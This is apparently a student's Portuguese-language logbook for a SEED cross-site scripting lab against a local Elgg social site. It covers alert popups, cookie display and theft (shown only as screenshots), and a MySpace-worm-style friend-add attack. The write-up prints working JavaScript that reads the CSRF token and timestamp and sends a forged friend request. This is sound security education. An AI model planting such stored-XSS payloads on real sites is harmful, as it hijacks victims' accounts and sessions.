# Logbook 10

## Tarefa 1 - Posting a Malicious Message to Display an Alert Window

O objetivo desta tarefa era colocar o seguinte programa JavaScript no perfil do utilizador.

```
<script>
    alert(’XSS’);
</script>
```

Desta forma, sempre que um utilizador tentar aceder ao nosso perfil vai aparecer o pop-up apresentado na imagem.


![](https://i.imgur.com/FsgiFVk.png)





## Tarefa 2 - Posting a Malicious Message to Display Cookies

O propósito desta tarefa era mais uma vez inserir um programa JavaScript no perfil para que apareça as cookies relacionadas ao utilizador, como se pode ver na imagem abaixo.


![](https://i.imgur.com/r4t6yoO.png)




## Tarefa 3 - Stealing Cookies from the Victim's Machine


Nesta tarefa, o objetivo é que as cookies da vítima sejam enviadas para o atacante. Para a realização, seguimos os passos apresentados nas imagens seguintes.


![](https://i.imgur.com/CgBrYSK.png)


![](https://i.imgur.com/amyRdqF.png)


![](https://i.imgur.com/GMcbYnd.png)


![](https://i.imgur.com/uQ2DiGa.png)



## Tarefa 4 - Becoming the Victim's Friend

Nesta tarefa, é pedido que se execute um ataque semelhante ao do MySpace em 2005. Para tal, podemos entender como é o *HTTP request* através do *Firefox's HTTP inspection tool*:

http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1670585185&__elgg_token=Y6m0zDegnxD7GpUuYZsm2g&__elgg_ts=1670585185&__elgg_token=Y6m0zDegnxD7GpUuYZsm2g


De seguida, é fornecido no enunciado um esqueleto de JavaScript para completarmos com o necessário para enviar o *HTTP request*:

Código JavaScript feito:


```
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
        var token="&__elgg_token="+elgg.security.token.__elgg_token; 
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token+ts+token;
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script> 
```

![](https://i.imgur.com/KUG8Cnw.png)


Adicionamos a linha `alert` para poder visualizar mais facilmente que o exploit está a funcionar como esperado.


![](https://i.imgur.com/1GsMTnx.png)


![](https://i.imgur.com/gjNeudq.png)


![](https://i.imgur.com/mWX3ucf.png)


### Questão 1:

As linhas 1 e 2 têm como objetivo criar dinamicamente o timestamp(ts) e o token para o *HTTP request* poder ser formatado corretamente e ser aceite pelo servidor. Estes valores têm de ser criados dinamicamente pois são únicos, diferindo de *request* para *request*, e utilizarão dados disponíveis apenas no momento do *request*.
    
### Questão 2:

Quando tentamos colocar o ataque no **Editor mode** não resultou, mas reparamos que teríamos que colocar no **Text Editor**.
    
#### ***Editor Mode***


![](https://i.imgur.com/OPIhdek.png)


#### ***Text Editor***


![](https://i.imgur.com/uzuntg8.png)

Com estas imagens, podemos ver que o **Editor Mode** adicionou ao texto que tínhamos inicialmente uma `tag` em HTML que imposibilita que o texto seja interpretado como um *script* e faça o *exploit*.
